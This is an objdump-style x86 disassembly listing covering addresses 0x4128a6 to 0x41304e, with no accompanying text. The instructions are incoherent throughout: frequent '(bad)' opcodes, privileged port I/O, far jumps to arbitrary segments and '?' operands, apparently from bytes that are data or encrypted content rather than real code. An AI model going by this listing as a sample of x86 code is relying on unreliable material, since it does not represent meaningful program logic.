  4128a6:	xchg   ebp,eax
  4128a7:	sub    DWORD PTR ds:0x88b15012,edx
  4128ad:	scas   eax,DWORD PTR es:[edi]
  4128ae:	pusha  
  4128af:	push   edx
  4128b0:	xchg   esi,eax
  4128b1:	dec    ecx
  4128b2:	add    al,0x9a
  4128b4:	clc    
  4128b5:	pop    eax
  4128b6:	mov    bh,0x8a
  4128b8:	xchg   ecx,eax
  4128b9:	das    
  4128ba:	push   ax
  4128bc:	pop    es
  4128bd:	pushf  
  4128be:	mov    ecx,0xb752c5ef
  4128c3:	jecxz  0x412858
  4128c5:	jns    0x4128a4
  4128c7:	jns    0x412932
  4128c9:	cli    
  4128ca:	xchg   esp,eax
  4128cb:	xlat   BYTE PTR ds:[ebx]
  4128cc:	jle    0x412915
  4128ce:	mov    bl,0x8e
  4128d0:	xchg   ebx,eax
  4128d1:	inc    eax
  4128d2:	pop    edi
  4128d3:	inc    ebp
  4128d4:	jl     0x412886
  4128d6:	inc    ecx
  4128d7:	mov    esi,DWORD PTR [edi-0x36c8a4e3]
  4128dd:	pusha  
  4128de:	jl     0x412916
  4128e0:	jae    0x4128be
  4128e2:	cmp    BYTE PTR [edi+0x33],0x6d
  4128e6:	aaa    
  4128e7:	mov    eax,ds:0xed8de9a7
  4128ec:	jnp    0x4128c6
  4128ee:	rcl    DWORD PTR [esi],0x12
  4128f1:	test   al,0x2f
  4128f3:	add    DWORD PTR [ecx-0x2a],0xffffff90
  4128f7:	xor    edi,DWORD PTR [ecx-0x7b150965]
  4128fd:	jp     0x412921
  4128ff:	jle    0x412892
  412901:	fs fs leave 
  412904:	nop
  412905:	pop    ss
  412906:	push   DWORD PTR [edx+ebp*4]
  412909:	retf   
  41290a:	popa   
  41290b:	jne    0x4128fd
  41290d:	inc    edx
  41290e:	in     al,0xce
  412910:	ja     0x41289f
  412912:	add    DWORD PTR [ecx-0x5f],ebx
  412915:	loope  0x412964
  412917:	dec    esi
  412918:	imul   edx,DWORD PTR [eax+0x32e03180],0x705565e1
  412922:	popa   
  412923:	mov    ds:0xadd51433,eax
  412928:	inc    ecx
  412929:	and    BYTE PTR [esi],0xbb
  41292c:	pop    ecx
  41292d:	xor    al,0xce
  41292f:	loopne 0x412943
  412931:	retf   
  412932:	mov    ah,0x1c
  412934:	(bad)  
  412935:	jae    0x412923
  412937:	test   BYTE PTR [ecx],dh
  412939:	push   ds
  41293a:	push   cs
  41293b:	dec    edx
  41293c:	jnp    0x412948
  41293e:	pop    eax
  41293f:	sub    DWORD PTR [ecx-0x7152f432],ebx
  412945:	ficom  WORD PTR ds:[ebx]
  412948:	pop    esi
  412949:	inc    si
  41294b:	das    
  41294c:	inc    ebx
  41294d:	sbb    al,0x9f
  41294f:	fsubp  st(1),st
  412951:	jge    0x4128f5
  412953:	jnp    0x41293e
  412955:	jnp    0x412928
  412957:	js     0x412989
  412959:	fsub   st(5),st
  41295b:	push   esp
  41295c:	xor    eax,0x9822bac9
  412961:	inc    edi
  412962:	xchg   ebx,eax
  412963:	dec    ebp
  412964:	in     al,0x3a
  412966:	and    al,0x90
  412968:	inc    esi
  412969:	pop    es
  41296a:	mov    al,0xac
  41296c:	pop    eax
  41296d:	mov    ch,0x9d
  41296f:	push   esp
  412970:	jmp    0xd1e6:0x93279c87
  412977:	sub    al,0x9
  412979:	fst    st(3)
  41297b:	jne    0x4129cd
  41297d:	sbb    al,0x32
  41297f:	bound  eax,QWORD PTR [ebx]
  412981:	cmovns ebx,DWORD PTR [esi+0x3a4e0d34]
  412988:	xchg   edx,eax
  412989:	and    BYTE PTR [eax],al
  41298b:	adc    DWORD PTR [ecx-0x29],edx
  41298e:	cld    
  41298f:	out    dx,al
  412990:	neg    DWORD PTR [edi]
  412992:	das    
  412993:	add    esi,DWORD PTR [eax-0x2256d2c7]
  412999:	lock mov ch,0xeb
  41299c:	lods   eax,DWORD PTR ds:[esi]
  41299d:	jb     0x4129e8
  41299f:	sbb    ecx,DWORD PTR [ebx]
  4129a1:	or     edx,DWORD PTR [edi-0x5858c87d]
  4129a7:	mov    dh,0x54
  4129a9:	jo     0x412a1b
  4129ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ac:	mov    eax,0xb97649b8
  4129b1:	outs   dx,DWORD PTR ds:[esi]
  4129b2:	test   DWORD PTR [esi],edx
  4129b4:	jo     0x412993
  4129b6:	in     al,dx
  4129b7:	ins    BYTE PTR es:[edi],dx
  4129b8:	mov    fs,WORD PTR [ebp+eiz*2+0xdd9687]
  4129bf:	ins    BYTE PTR es:[edi],dx
  4129c0:	(bad)  [esi]
  4129c2:	xchg   ebp,eax
  4129c3:	and    DWORD PTR [edx-0x4515d6aa],ecx
  4129c9:	cli    
  4129ca:	in     eax,0x37
  4129cc:	push   cs
  4129cd:	mov    ebp,0xe3f98d51
  4129d2:	mov    ecx,DWORD PTR [edx]
  4129d4:	and    ah,BYTE PTR [edi+0x1e2781f0]
  4129da:	mov    edi,0x85000535
  4129df:	jae    0x4129cf
  4129e1:	mov    bh,0x68
  4129e3:	test   DWORD PTR [ecx+0x59b17702],ecx
  4129e9:	in     eax,dx
  4129ea:	out    0x5d,al
  4129ec:	mov    ds:0x5738b823,eax
  4129f1:	mov    WORD PTR [ebp+0x57],es
  4129f4:	shl    BYTE PTR [eax+0x5e0dfbd6],cl
  4129fa:	into   
  4129fb:	fwait
  4129fc:	hlt    
  4129fd:	not    DWORD PTR [edx+0x3a]
  412a00:	push   eax
  412a01:	in     al,dx
  412a02:	dec    eax
  412a03:	scas   eax,DWORD PTR es:[edi]
  412a04:	js     0x412a57
  412a06:	and    al,BYTE PTR [edi]
  412a08:	inc    edx
  412a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a0a:	ret    0x94d7
  412a0d:	or     DWORD PTR [edi-0x63],edi
  412a10:	mov    bh,0xfa
  412a12:	adc    ebx,DWORD PTR [ecx-0x64943e89]
  412a18:	xor    BYTE PTR [ecx+0x15],0x8a
  412a1c:	mov    cl,0xfc
  412a1e:	sbb    eax,DWORD PTR [eax+0x19]
  412a21:	(bad)  
  412a23:	daa    
  412a24:	xchg   ebx,eax
  412a25:	not    DWORD PTR [eax+ecx*4+0x13cc4998]
  412a2c:	xor    DWORD PTR [edx+0x2b],0x19
  412a30:	ror    bl,0x5e
  412a33:	(bad)  
  412a35:	(bad)  [ebp+0x31c776de]
  412a3b:	jmp    0x9ace:0x5e4c27f9
  412a42:	and    BYTE PTR [ebx-0x3b],0xc1
  412a46:	push   ss
  412a47:	ds mov ebp,0x337cc370
  412a4d:	sbb    al,0x69
  412a4f:	lss    esi,FWORD PTR [eax-0x40406dcc]
  412a56:	push   ebx
  412a57:	inc    ebp
  412a58:	fld    TBYTE PTR [ebx-0x7a]
  412a5b:	adc    al,0xec
  412a5d:	add    dl,BYTE PTR [ebx]
  412a5f:	(bad)  
  412a60:	mov    edx,DWORD PTR [ecx+0x3aac6eee]
  412a66:	inc    esp
  412a67:	jg     0x412a9e
  412a69:	ja     0x4129f9
  412a6b:	and    ecx,DWORD PTR [edx+0x3b]
  412a6e:	test   BYTE PTR [ecx-0x51e0f3e],ch
  412a74:	int    0xcb
  412a76:	aas    
  412a77:	call   0xbdde6dc9
  412a7c:	push   eax
  412a7d:	cli    
  412a7e:	mov    dh,0x25
  412a80:	out    0x16,al
  412a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a83:	xor    al,0xdb
  412a85:	mov    esp,0x72cc5b66
  412a8a:	xlat   BYTE PTR ds:[ebx]
  412a8b:	xchg   esp,eax
  412a8c:	pop    esp
  412a8d:	pop    eax
  412a8e:	in     al,0x3b
  412a90:	jp     0x412a8d
  412a92:	fsubr  DWORD PTR [ebp+0x2c2c7ee3]
  412a98:	fwait
  412a99:	cmp    al,0x63
  412a9b:	fidiv  WORD PTR [edx+0x31]
  412a9e:	sub    BYTE PTR [edx],0x8c
  412aa1:	iret   
  412aa2:	xor    al,0x9f
  412aa4:	loope  0x412a3e
  412aa6:	or     eax,0xc0164317
  412aab:	or     ah,bh
  412aad:	push   0xe581d190
  412ab2:	sbb    eax,0x33aea598
  412ab7:	adc    eax,0xf7d759a4
  412abc:	pop    ebp
  412abd:	sub    DWORD PTR ds:0xf0e525a5,edi
  412ac3:	je     0x412b35
  412ac5:	push   es
  412ac6:	jo     0x412afc
  412ac8:	or     al,0xb0
  412aca:	mov    bh,0x88
  412acc:	adc    BYTE PTR [ecx+0x522e3dce],dl
  412ad2:	mov    ch,0xc9
  412ad4:	(bad)
  412ad7:	iret   
  412ad8:	mov    dl,0x88
  412ada:	jbe    0x412a9f
  412adc:	mov    bl,0x88
  412ade:	push   edx
  412adf:	cmp    dh,BYTE PTR [edx+0x2c]
  412ae2:	xlat   BYTE PTR ds:[ebx]
  412ae3:	data16 mov al,0x29
  412ae6:	mov    cl,0x66
  412ae8:	stos   BYTE PTR es:[edi],al
  412ae9:	mov    ds:0x9959659c,al
  412aee:	mov    ds:0x17e255ef,eax
  412af3:	dec    eax
  412af4:	mov    ds:0xb04a60a4,eax
  412af9:	push   ss
  412afa:	int    0xa1
  412afc:	shl    BYTE PTR [edx],1
  412afe:	retf   
  412aff:	gs pop edx
  412b01:	adc    DWORD PTR [edx+eax*4],0xb1153e7a
  412b08:	dec    ecx
  412b09:	retf   0xed12
  412b0c:	or     ah,BYTE PTR [edx]
  412b0e:	stos   BYTE PTR es:[edi],al
  412b0f:	(bad)  
  412b10:	(bad)  [esi-0x2]
  412b13:	push   es
  412b14:	xchg   esp,eax
  412b15:	(bad)  
  412b16:	pusha  
  412b17:	push   ss
  412b18:	in     eax,dx
  412b19:	shl    DWORD PTR [edx+ebx*1+0x48],1
  412b1d:	or     eax,ebp
  412b1f:	ret    
  412b20:	enter  0x884a,0x71
  412b24:	push   esi
  412b25:	xor    al,0x7b
  412b27:	pop    ecx
  412b28:	adc    BYTE PTR ds:0xcb6e1258,bl
  412b2e:	pop    edi
  412b2f:	mov    ch,0x1c
  412b31:	in     eax,dx
  412b32:	and    DWORD PTR [edx+0x3528fe6d],ebp
  412b38:	lock fadd DWORD PTR [edi]
  412b3b:	cmp    eax,0xe7151388
  412b40:	outs   dx,BYTE PTR ds:[esi]
  412b41:	and    DWORD PTR [esi-0x39],esi
  412b44:	jge    0x412b1a
  412b46:	jbe    0x412b86
  412b48:	mov    BYTE PTR [edi+0x2a],al
  412b4b:	cmp    ecx,eax
  412b4d:	inc    DWORD PTR [eax+0x19]
  412b50:	aam    0x27
  412b52:	push   0x7ec529b5
  412b57:	sub    edx,DWORD PTR [eax]
  412b59:	es push edx
  412b5b:	das    
  412b5c:	sbb    edi,ebx
  412b5e:	paddsw mm7,QWORD PTR [edx+edi*4+0x3e1b1cf]
  412b66:	scas   al,BYTE PTR es:[edi]
  412b67:	mov    bh,0x13
  412b69:	loop   0x412b4e
  412b6b:	jmp    0x6779:0xd0c0900b
  412b72:	xchg   ebp,eax
  412b73:	mov    ds:0xb37255b6,al
  412b78:	(bad)  
  412b7a:	sahf   
  412b7b:	xchg   DWORD PTR es:[eax-0x33],eax
  412b7f:	gs test eax,0x83df039f
  412b85:	imul   ebx,DWORD PTR [eax-0x69a5e8b9],0xbba7c9a7
  412b8f:	sbb    bl,BYTE PTR [ebp-0x4ef045aa]
  412b95:	mov    edi,0xa53b492f
  412b9a:	clc    
  412b9b:	(bad)  
  412b9c:	ds iret 
  412b9e:	inc    edi
  412b9f:	mov    ebx,0xb087c870
  412ba4:	or     ecx,DWORD PTR [eax+0x19]
  412ba7:	adc    bh,BYTE PTR [edx]
  412ba9:	xchg   esp,eax
  412baa:	xor    WORD PTR [eax-0x39],cx
  412bae:	cmc    
  412baf:	inc    ebx
  412bb0:	xor    al,0x8c
  412bb2:	jmp    0x412b52
  412bb4:	or     ebx,DWORD PTR [eax]
  412bb6:	addr16 pop esp
  412bb8:	jae    0x412bcf
  412bba:	fdiv   QWORD PTR [eax+0x68c5e862]
  412bc0:	rcr    BYTE PTR [edx-0x35],1
  412bc3:	and    cl,BYTE PTR fs:[edi]
  412bc6:	pop    esi
  412bc7:	(bad)
  412bca:	cmp    BYTE PTR [edx],ch
  412bcc:	icebp  
  412bcd:	js     0x412c34
  412bcf:	lods   al,BYTE PTR ds:[esi]
  412bd0:	arpl   WORD PTR [ebp+0x50fba74a],cx
  412bd6:	mov    ds:0xc7f13897,eax
  412bdb:	adc    DWORD PTR [edi+0x4a],ecx
  412bde:	mov    dh,0x8b
  412be0:	pop    es
  412be1:	dec    ecx
  412be2:	fnstsw WORD PTR [eax]
  412be4:	stos   BYTE PTR es:[edi],al
  412be5:	and    al,0x53
  412be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be8:	lods   al,BYTE PTR ds:[esi]
  412be9:	push   esi
  412bea:	pop    esi
  412beb:	add    al,0x25
  412bed:	push   esi
  412bee:	inc    edi
  412bef:	push   es
  412bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf1:	es mov eax,0xc267dd2f
  412bf7:	add    ah,BYTE PTR [ecx]
  412bf9:	jmp    0x412bd8
  412bfb:	mov    esp,0x33617fb0
  412c00:	shl    BYTE PTR [ebx+eiz*8-0x45],0xa8
  412c05:	push   0xffffffee
  412c07:	cwde   
  412c08:	and    bl,0x7
  412c0b:	cld    
  412c0c:	inc    ecx
  412c0d:	call   0x9565:0x98ab7bf3
  412c14:	xchg   BYTE PTR [ecx-0x4e],bl
  412c17:	stos   BYTE PTR es:[edi],al
  412c18:	fisubr DWORD PTR [edx-0x565e0699]
  412c1e:	fcomip st,st(2)
  412c20:	or     eax,0x18346f7f
  412c25:	xor    eax,0x919304c5
  412c2a:	jae    0x412bf7
  412c2c:	cdq    
  412c2d:	push   es
  412c2e:	and    eax,0x5cf83fb8
  412c33:	sbb    edx,DWORD PTR [edx-0x6b]
  412c36:	dec    edi
  412c37:	es test eax,0xdb5b4680
  412c3d:	ficom  WORD PTR [ebx-0x4d5a29dd]
  412c43:	sub    eax,0xe8e62d3e
  412c48:	adc    DWORD PTR es:[ecx+0x69],ecx
  412c4c:	push   ebp
  412c4d:	std    
  412c4e:	sub    BYTE PTR [ebp+0x2bc1d99d],ah
  412c54:	pop    esp
  412c55:	shr    DWORD PTR [ebp-0x2b],cl
  412c58:	call   0x9450:0x33869394
  412c5f:	push   edx
  412c60:	out    0xb2,eax
  412c62:	add    al,0x42
  412c64:	mov    edi,0x550b88c7
  412c69:	inc    ecx
  412c6a:	sbb    BYTE PTR [edx+0x6a],bl
  412c6d:	add    al,0xcc
  412c6f:	sbb    DWORD PTR [esi],esp
  412c71:	in     al,dx
  412c72:	ins    DWORD PTR es:[edi],dx
  412c73:	(bad)  
  412c75:	mov    bh,0x95
  412c77:	scas   eax,DWORD PTR es:[edi]
  412c78:	adc    BYTE PTR [edx+eiz*2-0x601053f0],al
  412c7f:	(bad)  
  412c80:	xchg   esp,eax
  412c81:	push   ebx
  412c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c83:	sti    
  412c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c85:	mov    cl,0x61
  412c87:	mov    DWORD PTR [ebp+0x4c],ecx
  412c8a:	or     DWORD PTR [edx+0x23],ecx
  412c8d:	loopne 0x412c46
  412c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c90:	cdq    
  412c91:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412c93:	aas    
  412c94:	popa   
  412c95:	push   ds
  412c96:	fdivr  DWORD PTR fs:[edx-0x5e]
  412c9a:	repnz (bad) 
  412c9d:	mov    edi,0x953ba8
  412ca2:	out    dx,al
  412ca3:	mov    DWORD PTR [esi-0xf],edi
  412ca6:	or     BYTE PTR [ecx-0xc235ae6],ah
  412cac:	loope  0x412c97
  412cae:	push   esp
  412caf:	add    eax,0xe0e8f871
  412cb4:	adc    BYTE PTR [eax],0x1b
  412cb7:	pop    ecx
  412cb8:	or     al,BYTE PTR [ecx]
  412cba:	pop    es
  412cbb:	inc    eax
  412cbc:	mov    edx,0x2b59c1be
  412cc1:	sub    dl,al
  412cc3:	push   eax
  412cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc6:	xchg   edx,eax
  412cc7:	and    edi,DWORD PTR [ebx+0x47]
  412cca:	or     al,0x75
  412ccc:	repz fucomp st(1)
  412ccf:	push   0xffffffd6
  412cd1:	out    0x1c,al
  412cd3:	pop    ss
  412cd4:	or     eax,0x5f75402c
  412cd9:	repnz mov ds:0x9913ffee,al
  412cdf:	adc    BYTE PTR [ecx],bl
  412ce1:	jg     0x412c97
  412ce3:	ror    DWORD PTR [esi],1
  412ce5:	in     al,0x68
  412ce7:	mov    bl,0x52
  412ce9:	js     0x412d65
  412ceb:	sbb    eax,0x91eab9f0
  412cf0:	outs   dx,BYTE PTR ds:[esi]
  412cf1:	cmc    
  412cf2:	fistp  DWORD PTR [ecx-0x5b5c84f3]
  412cf8:	lea    eax,[ebx+0x76c5e171]
  412cfe:	sub    BYTE PTR [esp+ecx*8],al
  412d01:	add    ebx,ebp
  412d03:	mov    ch,0x9c
  412d05:	xor    BYTE PTR [edx+0x6a1a027],ah
  412d0b:	xchg   ebx,eax
  412d0c:	jecxz  0x412d86
  412d0e:	fwait
  412d0f:	push   esp
  412d10:	gs cmp eax,0x1f52e471
  412d16:	sub    eax,0xb0b74ee8
  412d1b:	and    BYTE PTR [ecx+0x53],dl
  412d1e:	or     DWORD PTR [ecx+0x3c69f7c4],esp
  412d24:	out    0xe8,eax
  412d26:	sub    al,BYTE PTR ds:[ecx+0xbbcd713]
  412d2d:	je     0x412ce0
  412d2f:	pop    eax
  412d30:	xor    DWORD PTR [ebx-0x782f38f1],ecx
  412d36:	popf   
  412d37:	(bad)  
  412d38:	cli    
  412d39:	lahf   
  412d3a:	adc    eax,DWORD PTR [ebp-0x43731f8f]
  412d40:	daa    
  412d41:	mov    WORD PTR [eax+0x2b],gs
  412d44:	scas   eax,DWORD PTR es:[edi]
  412d45:	sbb    eax,0x98256b5e
  412d4a:	pop    ss
  412d4b:	aad    0xf4
  412d4d:	jl     0x412d30
  412d4f:	mov    dl,0x9f
  412d51:	or     al,0xbc
  412d53:	push   ebp
  412d54:	sti    
  412d55:	fidivr WORD PTR [eax+0x14]
  412d58:	xchg   ecx,eax
  412d59:	test   BYTE PTR [edx],ch
  412d5b:	icebp  
  412d5c:	add    DWORD PTR [ebp-0x56],0xffffffdc
  412d60:	pop    fs
  412d62:	sub    esi,DWORD PTR [edx-0x69]
  412d65:	lods   al,BYTE PTR ds:[esi]
  412d66:	loope  0x412cf5
  412d68:	(bad)  
  412d6b:	dec    ebx
  412d6c:	mov    bl,dl
  412d6e:	aam    0xfd
  412d70:	mov    ebp,0xe1bb11d7
  412d75:	imul   BYTE PTR [edx+0x2f]
  412d78:	mov    al,0xe5
  412d7a:	test   BYTE PTR [ebx-0x119363eb],dh
  412d80:	sti    
  412d81:	jns    0x412d90
  412d83:	imul   ecx,edx,0x300e7642
  412d89:	ja     0x412e09
  412d8b:	mov    ds:0x68c3d296,al
  412d90:	popa   
  412d91:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  412d93:	cli    
  412d94:	fdiv   DWORD PTR [ebp+0x237936d3]
  412d9a:	fimul  DWORD PTR [ebx+ecx*1]
  412d9d:	mov    cl,0xd6
  412d9f:	sub    al,BYTE PTR [edi-0x75644860]
  412da5:	pop    esp
  412da6:	cli    
  412da7:	mov    ?,esp
  412da9:	inc    esp
  412daa:	fwait
  412dab:	or     DWORD PTR [eax],eax
  412dad:	sahf   
  412dae:	cmp    al,0xe9
  412db0:	repz push 0x902a0f80
  412db6:	pop    edx
  412db7:	gs pop esp
  412db9:	dec    edx
  412dba:	(bad)  
  412dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dbc:	in     al,0x4c
  412dbe:	jmp    0x412d94
  412dc0:	pop    esi
  412dc1:	mov    dh,0x5b
  412dc3:	add    ah,BYTE PTR [eax+0x2e40bc4f]
  412dc9:	xchg   ecx,eax
  412dca:	ss pop esp
  412dcc:	and    al,0xf2
  412dce:	xlat   BYTE PTR ds:[ebx]
  412dcf:	xchg   esp,eax
  412dd0:	leave  
  412dd1:	xor    esp,DWORD PTR [ecx-0x40]
  412dd4:	and    al,0xe1
  412dd6:	loope  0x412e2d
  412dd8:	hlt    
  412dd9:	inc    ecx
  412dda:	cmp    al,0x32
  412ddc:	adc    al,0x52
  412dde:	sub    esp,edi
  412de0:	dec    ebp
  412de1:	sbb    eax,0xbf754b8e
  412de6:	iret   
  412de7:	jnp    0x1436aadd
  412ded:	in     al,0x0
  412def:	imul   DWORD PTR [edi+ebx*4-0x3f]
  412df3:	pop    esi
  412df4:	xchg   esi,eax
  412df5:	sbb    DWORD PTR ds:[edx+esi*1+0xc5724b4],0x88ebbfef
  412e01:	in     al,0x3e
  412e03:	inc    edx
  412e04:	xchg   ebx,eax
  412e05:	rcl    BYTE PTR [ebx],1
  412e07:	int3   
  412e08:	adc    al,0x21
  412e0a:	and    eax,0xccde4288
  412e0f:	jg     0x412e51
  412e11:	pop    esp
  412e12:	or     BYTE PTR [eax+ebx*4],bl
  412e15:	pop    ebx
  412e16:	cmp    DWORD PTR [ebp+0x34],esi
  412e19:	xor    bh,BYTE PTR [ebx+0xa]
  412e1c:	fbld   TBYTE PTR [ebp+eiz*1-0x62db8d31]
  412e23:	pop    eax
  412e24:	test   al,0xd9
  412e26:	cld    
  412e27:	clc    
  412e28:	push   edx
  412e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2a:	(bad)  
  412e2b:	xchg   edx,eax
  412e2c:	fcomp  QWORD PTR [eax]
  412e2e:	or     al,0xd3
  412e30:	bound  eax,QWORD PTR [ebx-0x56efa6b3]
  412e36:	arpl   bp,ax
  412e38:	jmp    0x412e83
  412e3a:	push   ds
  412e3b:	jb     0x412e42
  412e3d:	outs   dx,BYTE PTR ds:[esi]
  412e3e:	push   ebx
  412e3f:	mov    ch,0x5f
  412e41:	cld    
  412e42:	jge    0x412dd8
  412e44:	cdq    
  412e45:	add    DWORD PTR [esp+eiz*4+0x8],ebx
  412e49:	dec    ecx
  412e4a:	test   al,0xb1
  412e4c:	inc    esi
  412e4d:	out    dx,eax
  412e4e:	loopne 0x412e5c
  412e50:	not    DWORD PTR [edx]
  412e52:	xor    eax,0x45303978
  412e57:	dec    DWORD PTR [ebx+esi*2+0x31a987e3]
  412e5e:	push   esp
  412e5f:	push   edi
  412e60:	add    esp,DWORD PTR [edi+0x7a]
  412e63:	dec    ebp
  412e64:	inc    edx
  412e65:	and    ch,bh
  412e67:	mov    ds:0xad623a51,al
  412e6c:	out    dx,al
  412e6d:	pop    ebp
  412e6e:	add    eax,0x4809f250
  412e73:	hlt    
  412e74:	loop   0x412e8f
  412e76:	addr16 imul edx,edx,0x2f
  412e7a:	outs   dx,DWORD PTR ds:[esi]
  412e7b:	mov    dl,0x57
  412e7d:	rcl    BYTE PTR [ecx-0x74dedf0f],0x24
  412e84:	mov    edx,0x216055a6
  412e89:	ret    
  412e8a:	mov    esi,0x223110bf
  412e8f:	adc    bl,dl
  412e91:	cmp    BYTE PTR [ebx+0x6],bh
  412e94:	div    DWORD PTR [edx+0x1e]
  412e97:	sub    eax,ecx
  412e99:	mov    ebx,0x4621e871
  412e9e:	push   ds
  412e9f:	mov    ds:0xba979d2f,al
  412ea4:	les    edx,FWORD PTR [eax+0x10]
  412ea7:	popf   
  412ea8:	mov    ebp,0x55fe2f38
  412ead:	es xor bh,dl
  412eb0:	dec    edx
  412eb1:	das    
  412eb2:	xlat   BYTE PTR ds:[ebx]
  412eb3:	sub    edi,edi
  412eb5:	faddp  st(2),st
  412eb7:	fiadd  DWORD PTR [ecx+0x2befe557]
  412ebd:	and    al,0x35
  412ebf:	mov    esp,0x37265d85
  412ec4:	sbb    al,0x99
  412ec6:	push   esi
  412ec8:	repz pusha 
  412eca:	jns    0x412f46
  412ecc:	popa   
  412ecd:	inc    ebp
  412ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ecf:	rcl    DWORD PTR [ebx-0x545588],1
  412ed5:	push   edx
  412ed6:	inc    edx
  412ed7:	or     ebx,DWORD PTR ds:0x49eddf98
  412edd:	sbb    edi,ebx
  412edf:	and    cl,ah
  412ee1:	dec    edx
  412ee2:	mov    bl,0x4e
  412ee4:	cmp    al,0xaa
  412ee6:	jae    0x412ea2
  412ee8:	pushf  
  412ee9:	out    0x33,al
  412eeb:	sbb    ah,BYTE PTR [eax]
  412eed:	jno    0x412f63
  412eef:	daa    
  412ef0:	les    ebp,FWORD PTR [eax-0x69]
  412ef3:	push   es
  412ef4:	pop    ebp
  412ef5:	or     BYTE PTR [eax-0x60],0x3
  412ef9:	xchg   ecx,eax
  412efa:	mov    ?,edx
  412efc:	sub    DWORD PTR gs:[edx+0x41],ebx
  412f00:	lods   al,BYTE PTR ds:[esi]
  412f01:	aaa    
  412f02:	add    bl,al
  412f04:	in     al,0xd7
  412f06:	xchg   esi,eax
  412f07:	and    ebp,DWORD PTR [ebp+0x3a]
  412f0a:	jle    0x412ef4
  412f0c:	gs leave 
  412f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f0f:	imul   DWORD PTR [eax-0x14]
  412f12:	hlt    
  412f13:	ja     0x412f3c
  412f15:	sbb    bh,ah
  412f17:	hlt    
  412f18:	xchg   ecx,eax
  412f19:	ret    0xf569
  412f1c:	sbb    ebx,ebp
  412f1e:	pop    esp
  412f1f:	cmp    DWORD PTR [eax-0x782140e8],0xffffff9e
  412f26:	out    dx,eax
  412f27:	sti    
  412f28:	pop    edx
  412f29:	mov    esi,0x9f6b4ee
  412f2e:	fsub   DWORD PTR [esp+ebx*8]
  412f31:	sbb    BYTE PTR [eax+0x1189d828],dl
  412f37:	sbb    eax,0x159742c8
  412f3c:	ja     0x412fa6
  412f3e:	in     eax,dx
  412f3f:	neg    BYTE PTR [ebx+edx*4-0x5dc74c75]
  412f46:	or     esi,DWORD PTR [ebx-0x6cdf9682]
  412f4c:	inc    ebp
  412f4d:	mov    ebx,fs
  412f4f:	inc    edi
  412f50:	loopne 0x412fcf
  412f52:	add    bl,BYTE PTR [ebx+0x751d77c8]
  412f58:	shl    DWORD PTR [ecx-0x5b61495f],cl
  412f5e:	jp     0x412f4d
  412f60:	rcr    DWORD PTR [edx-0x15],1
  412f63:	int3   
  412f64:	and    eax,0xd921e41a
  412f69:	je     0x412fa6
  412f6b:	aam    0x41
  412f6d:	jmp    0x412fd7
  412f6f:	and    ch,dh
  412f71:	(bad)  
  412f72:	xor    eax,0xd5fb2eb2
  412f77:	mov    dl,0xa8
  412f79:	sbb    bl,BYTE PTR [ebp+0x48e7857a]
  412f7f:	cmp    bl,BYTE PTR [ebp+0xb]
  412f82:	push   0x9
  412f84:	out    dx,al
  412f85:	(bad)  
  412f86:	repz mov al,BYTE PTR [eax+0x11e04b14]
  412f8d:	jne    0x412fa7
  412f8f:	mov    ebp,0x5338f279
  412f94:	les    esp,FWORD PTR [ebx]
  412f96:	mov    ds,esi
  412f98:	fsubr  QWORD PTR [ecx]
  412f9a:	adc    DWORD PTR [eax],ebp
  412f9c:	fwait
  412f9d:	cli    
  412f9e:	aam    0xe7
  412fa0:	mov    ecx,0x46774b2e
  412fa5:	or     DWORD PTR [ebx+ebp*2+0x278390d0],0x63dfff67
  412fb0:	(bad)
  412fb3:	mov    al,ds:0xea0a3c58
  412fb8:	fadd   QWORD PTR [edi+0x371f6b25]
  412fbe:	mov    esp,0x3e77f6f
  412fc3:	imul   ebx,DWORD PTR [edx+ebp*2+0x449cbbe9],0xb9246f39
  412fce:	es push es
  412fd0:	scas   eax,DWORD PTR es:[edi]
  412fd1:	or     DWORD PTR [ebp-0x79fc0d13],0xd5fb3054
  412fdb:	mov    esi,0x56488088
  412fe0:	addr16 jns 0x412fed
  412fe3:	lods   al,BYTE PTR ds:[esi]
  412fe4:	out    dx,al
  412fe5:	sub    al,0xa4
  412fe7:	xchg   edx,eax
  412fe8:	ret    0xb521
  412feb:	mov    ecx,0x89466adf
  412ff0:	jecxz  0x41306b
  412ff2:	imul   esp,edi,0x44b22cdd
  412ff8:	dec    esp
  412ff9:	dec    ebp
  412ffa:	add    dl,BYTE PTR [esi]
  412ffc:	mov    dh,0xdb
  412ffe:	jmp    0x413069
  413000:	sbb    al,0x82
  413002:	ficom  WORD PTR [bx+di+0x296c]
  413007:	jbe    0x412fbf
  413009:	ds stos BYTE PTR es:[edi],al
  41300b:	xor    BYTE PTR [ebx],ah
  41300d:	dec    edi
  41300e:	fidivr DWORD PTR [ecx]
  413010:	or     al,0xe8
  413012:	cmp    al,0xea
  413014:	jne    0x413075
  413016:	xor    cl,ch
  413018:	xchg   edi,eax
  413019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41301a:	push   ds
  41301b:	out    0x2,eax
  41301d:	push   edi
  41301e:	add    BYTE PTR [edi+0xe],dl
  413021:	arpl   cx,bp
  413023:	jo     0x413023
  413025:	adc    WORD PTR [ebx],0xffaa
  413029:	gs mov esi,0x1d428a1a
  41302f:	cmp    al,0x82
  413031:	mov    ?,WORD PTR [ebp-0x45c15d5c]
  413037:	jle    0x41304d
  413039:	je     0x41307f
  41303b:	loopne 0x413034
  41303d:	push   0x39298277
  413042:	hlt    
  413043:	retf   0x5871
  413046:	shl    DWORD PTR [edi+ebx*8-0x1195e7d1],cl
  41304d:	inc    edx
  41304e:	jge    0x413056
